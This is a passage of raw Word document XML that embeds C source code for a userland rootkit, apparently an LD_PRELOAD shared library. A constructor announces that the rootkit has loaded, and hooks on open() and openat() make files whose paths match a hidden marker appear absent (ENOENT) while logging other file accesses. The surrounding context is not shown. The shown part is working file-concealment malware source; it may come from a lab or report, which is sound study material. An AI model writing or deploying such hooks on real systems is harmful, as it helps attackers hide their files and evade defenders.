    <w:p w14:paraId="6A74B355" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    vfprintf(fp, fmt, ap);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A10C44F" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    va_end(ap);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1047CAEA" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fputc('\n', fp);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D404009" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fclose(fp);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14E5689F" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FEB5CF3" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4359B12A" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>static int is_hidden_path(const char *pathname)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62EE7EC2" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7281C4E5" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return (pathname != NULL &amp;&amp; strstr(pathname, HIDDEN_FILE) != NULL);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="776B7F06" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71F4F081" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CBB7148" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>/* ---------- runs automatically when the library is loaded ---------- */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DF5D111" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>__attribute__((constructor))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A6240F4" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>static void rk_init(void)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2662D14B" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3803FF71" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    rk_log("=== rootkit.so loaded (pid=%d ppid=%d)", getpid(), getppid());</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C6B59B0" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fprintf(stderr, "[rootkit] interception active for pid %d\n", getpid());</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D5C5AEE" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B191376" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C0C55C7" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>/* ---------- file access: open ---------- */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0043B12D" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>int open(const char *pathname, int flags, ...)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FF0C4D1" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12BB6BFC" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    static int (*real_open)(const char *, int, ...) = NULL;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B2A4D2F" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    mode_t mode = 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60DFC51C" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0399B67E" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (flags &amp; O_CREAT) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AFAA1CB" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        va_list ap;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C1DAE0E" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        va_start(ap, flags);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59AB2999" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        mode = va_arg(ap, mode_t);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1667BC9C" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        va_end(ap);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24BB60F9" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4384020E" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (real_open == NULL)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A4FA582" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        real_open = dlsym(RTLD_NEXT, "open");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C8D3E93" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (in_hook || pathname == NULL)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71A658C7" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return real_open(pathname, flags, mode);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15A8C028" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05E08DBC" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (is_hidden_path(pathname)) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12AA188D" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        in_hook = 1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="227C95FE" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        rk_log("open(\"%s\") BLOCKED -&gt; ENOENT (concealed)", pathname);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2092F0AA" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        in_hook = 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="402776DC" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        errno = ENOENT;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4507AC3D" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return -1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52678397" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6830131E" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (strcmp(pathname, LOG_PATH) != 0) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="175A48E2" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        in_hook = 1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DAAB78D" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        rk_log("open(\"%s\", flags=0x%x) intercepted", pathname, flags);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="195097EF" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        in_hook = 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43E15B1B" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3770E5E3" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return real_open(pathname, flags, mode);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01300F75" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BCDB4C0" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D9BFAE7" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>/* ---------- file access: openat ---------- */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33F52408" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>int openat(int dirfd, const char *pathname, int flags, ...)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E741A43" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27206C3F" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    static int (*real_openat)(int, const char *, int, ...) = NULL;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21E57E43" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    mode_t mode = 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C298DDA" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6133E944" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (flags &amp; O_CREAT) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F88C653" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        va_list ap;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D2D11DA" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        va_start(ap, flags);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2512BEC6" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        mode = va_arg(ap, mode_t);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B2D7EF4" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        va_end(ap);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B6C4C5A" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04BA0040" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (real_openat == NULL)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EA84BEC" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        real_openat = dlsym(RTLD_NEXT, "openat");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4975912C" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
